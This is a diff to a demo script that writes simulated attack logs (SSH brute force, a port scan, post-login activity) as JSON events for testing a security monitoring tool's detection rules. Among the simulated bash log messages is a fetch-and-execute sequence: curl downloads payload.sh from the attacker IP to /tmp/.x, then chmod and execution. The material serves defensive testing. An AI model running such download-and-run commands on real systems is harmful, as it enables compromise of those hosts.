@@ -17,9 +17,9 @@ Usage::
     python scripts/demo_attack_simulation.py --skip-rules
     python scripts/demo_attack_simulation.py --api-base http://localhost:8000/api/v1
 
-Idempotent: re-running the script overwrites the log files, refreshes the
-timestamps and re-ingests. Existing sources/rules with the same name are
-patched in-place.
+Re-runnable: re-running the script appends a fresh event block to each demo
+log file, refreshes timestamps and re-ingests. Existing sources/rules with
+the same name are patched in-place.
 """
 from __future__ import annotations
 
@@ -96,30 +96,56 @@ def _ssh_brute_force_lines() -> list[str]:
         offset = 600 - i * 5  # 10 minutes ago, every 5s
         user = "root" if i % 2 == 0 else "admin"
         port = 54320 + i
-        lines.append(
-            f"{iso(offset)} {host} sshd[{1300 + i}]: Failed password for invalid user "
-            f"{user} from {attacker_ip} port {port} ssh2"
-        )
+        lines.append(json.dumps({
+            "@timestamp": iso(offset),
+            "severity": "warning",
+            "host": host,
+            "service": "sshd",
+            "message": (
+                f"Failed password for invalid user {user} from {attacker_ip} "
+                f"port {port} ssh2"
+            ),
+        }, separators=(",", ":")))
     # Then a successful login from the same IP (credentials guessed!)
-    lines.append(
-        f"{iso(555)} {host} sshd[1400]: Accepted password for root from {attacker_ip} port 54330 ssh2"
-    )
-    lines.append(
-        f"{iso(553)} {host} sshd[1400]: pam_unix(sshd:session): session opened for user root by (uid=0)"
-    )
+    lines.append(json.dumps({
+        "@timestamp": iso(555),
+        "severity": "warning",
+        "host": host,
+        "service": "sshd",
+        "message": f"Accepted password for root from {attacker_ip} port 54330 ssh2",
+    }, separators=(",", ":")))
+    lines.append(json.dumps({
+        "@timestamp": iso(553),
+        "severity": "info",
+        "host": host,
+        "service": "sshd",
+        "message": "pam_unix(sshd:session): session opened for user root by (uid=0)",
+    }, separators=(",", ":")))
     # Immediate suspicious action: download + execute payload
-    lines.append(
-        f"{syslog_bsd(550)} {host} bash[1410]: root : TTY=pts/0 ; PWD=/root ; "
-        f"USER=root ; COMMAND=/usr/bin/curl -s http://{attacker_ip}/payload.sh -o /tmp/.x"
-    )
-    lines.append(
-        f"{syslog_bsd(548)} {host} bash[1411]: root : TTY=pts/0 ; PWD=/root ; "
-        f"USER=root ; COMMAND=/bin/chmod +x /tmp/.x"
-    )
-    lines.append(
-        f"{syslog_bsd(545)} {host} bash[1412]: root : TTY=pts/0 ; PWD=/root ; "
-        f"USER=root ; COMMAND=/tmp/.x"
-    )
+    lines.append(json.dumps({
+        "@timestamp": iso(550),
+        "severity": "error",
+        "host": host,
+        "service": "bash",
+        "message": (
+            f"root : TTY=pts/0 ; PWD=/root ; USER=root ; "
+            f"COMMAND=/usr/bin/curl -s http://{attacker_ip}/payload.sh -o /tmp/.x"
+        ),
+    }, separators=(",", ":")))
+    lines.append(json.dumps({
+        "@timestamp": iso(548),
+        "severity": "warning",
+        "host": host,
+        "service": "bash",
+        "message": "root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x /tmp/.x",
+    }, separators=(",", ":")))
+    lines.append(json.dumps({
+        "@timestamp": iso(545),
+        "severity": "error",
+        "host": host,
+        "service": "bash",
+        "message": "root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/tmp/.x",
+    }, separators=(",", ":")))
     return lines
 
 
@@ -241,11 +267,13 @@ def _port_scan_lines() -> list[str]:
     lines = []
     for i, port in enumerate(ports):
         ts = iso(240 - i)  # one packet per second – very obvious scan
-        lines.append(
-            f"{ts} {host} kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:ab:cd:ef "
-            f"SRC={src_ip} DST=10.0.0.10 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=0 DF "
-            f"PROTO=TCP SPT=44321 DPT={port} WINDOW=29200 RES=0x00 SYN URGP=0"
-        )
+        lines.append(json.dumps({
+            "@timestamp": ts,
+            "severity": "warning",
+            "host": host,
+            "service": "ufw",
+            "message": f"[UFW BLOCK] SRC={src_ip} DST=10.0.0.10 DPT={port}",
+        }, separators=(",", ":")))
     return lines
 
 
@@ -643,7 +671,12 @@ def _write_seed_files(seed_dir: Path) -> list[tuple[AttackSource, Path]]:
         path = seed_dir / source.filename
         lines = list(source.lines_factory())
         content = "\n".join(lines) + "\n"
-        path.write_text(content, encoding="utf-8")
+        if path.exists() and path.stat().st_size > 0:
+            with path.open("a", encoding="utf-8") as handle:
+                handle.write("\n")
+                handle.write(content)
+        else:
+            path.write_text(content, encoding="utf-8")
         written.append((source, path))
     return written
 
